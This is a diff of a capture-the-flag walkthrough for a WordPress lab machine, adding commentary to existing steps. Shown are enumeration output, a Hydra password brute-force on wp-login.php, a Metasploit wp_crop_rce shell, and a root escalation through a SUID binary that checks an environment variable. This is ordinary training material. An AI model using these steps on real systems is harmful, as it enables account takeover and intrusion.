@@ -53,6 +53,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 65.16 seconds
 ```
 
+The website seems to be broken, so I read the description. Let's add the ip to the `/etc/hosts` list.
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ cat /etc/hosts                                        
@@ -66,16 +68,17 @@ ff02::2 ip6-allrouters
 ```
 
 ### Exploration
-comments and feed not too interesting
+Looking and exploring the website we have:
 
-author thingy
+- comments and feed in the `meta` section not too interesting
+- Looked at the posts. Nothing in the post too interesting.
+- Looked at both the authors (click on authors), we can see their usernames
+
 ![](https://i.imgur.com/rP25U0x.png)
 
 ![](https://i.imgur.com/8TjQfuU.png)
 
-interesting
-
-bjoel and kwheel two usernames
+Interesting! So, `bjoel` and `kwheel` are two usernames we have.
 
 
 ### Gobuster
@@ -98,11 +101,10 @@ bjoel and kwheel two usernames
 /%20                  (Status: 301) [Size: 0] [--> http://10.10.129.188/]              
 
 ```
-
+Nothing interesting. Looks like a WordPress CMS (no surprises - the template is from Frontity iirc).
 
 ### SMB
-![](https://i.imgur.com/Ql3cqlS.png)
-
+Let's explore the SMB port that was open.
 ```
 ┌──(kali㉿kali)-[/tmp]
 └─$ smbclient -L 10.10.129.188 -N                                           130 ⨯
@@ -138,31 +140,24 @@ Went to the qrcode link. Here's not a rickroll XD
 
 https://www.youtube.com/watch?v=eFTLKWw542g
 
+![](https://i.imgur.com/Ql3cqlS.png)
+
+Clearly the rabbit hole.
+
 ### Bruteforce passwords
+I cant seem to find any creds lying around. So we'll try getting into `bjoel` and `kwheel`'s accounts by bruteforcing with Hydra.
 
-I cant seem to find any creds lying around. Imma try getting into bjoel and kwheel's accounts by bruteforcing with Hydra.
-
+First we want the form structure. So, I fired up burpsuite, and got the following:
 ```
 POST /wp-login.php HTTP/1.1
 Host: blog.thm
-Content-Length: 97
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://blog.thm
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://blog.thm/wp-login.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: wordpress_test_cookie=WP+Cookie+check
-Connection: close
+
+...
 
 log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1
 ```
 
-get the naming scheme of the http form.
-
+Okay great! Let's go for Hydra now.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -179,7 +174,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 06:33:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-08 06:37:11
 ```
 
-We need this for WP exploit
+## Foothold
+So, now that we have the credentials ... so now what? Well whenever in doubt, we go back to the nmap scan. We see that the version 5.0 is being used. Looking it up, we have something tasty :D
+
+Let's fire up `msfconsole` with the exploit [here in detail](https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips) and [exploit-db](https://www.exploit-db.com/exploits/49512). Setup `options` and then `check`. Looks vulnerable, lesgooo.
 
 ```
 msf6 exploit(multi/http/wp_crop_rce) > exploit
@@ -204,7 +202,12 @@ bash: no job control in this shell
 www-data@blog:/var/www/wordpress$ 
 ```
 
+So I checked the `bjoel/user.txt`, but ... the classic "TRY HARDER" was shown to me ;-;
 
+Let's now look for the PrivEsc.
+
+## Priv Esc
+Let's first look at who all have the set-uid bit. 
 ```
 www-data@blog:/var/www/wordpress$ find / -type f -perm -u=s 2>/dev/null
 find / -type f -perm -u=s 2>/dev/null
@@ -236,8 +239,13 @@ find / -type f -perm -u=s 2>/dev/null
 ...
 ```
 
+The thing that pops out is: `/usr/sbin/checker`
 
-`/usr/sbin/checker`
+```
+www-data@blog:/var/www/wordpress$ /usr/sbin/checker
+/usr/sbin/checker
+Not an Admin
+```
 
 ```
 www-data@blog:/var/www/wordpress$ strings /usr/sbin/checker
@@ -272,11 +280,9 @@ Not an Admin
 +++ exited (status 0) +++
 ```
 
-```
-www-data@blog:/var/www/wordpress$ /usr/sbin/checker
-/usr/sbin/checker
-Not an Admin
-```
+Okay so. At this point I used nc to get the binary to my machine, and then, much later, realised that I went too complicated opening radare lol.
+
+Here's what to do instead. Realise that `getenv("admin")` means that we need some environmental variable. So,
 
 ```
 www-data@blog:/var/www/wordpress$ export admin=admin
@@ -287,9 +293,13 @@ whoami
 root
 ```
 
+Very nice. Let's also get the user flag while we are at it XD
+
 ```
 root@blog:/var/www/wordpress# find / -type f -name user.txt 2>/dev/null
 find / -type f -name user.txt 2>/dev/null
 /home/bjoel/user.txt
 /media/usb/user.txt
 ```
+
+And we are done!
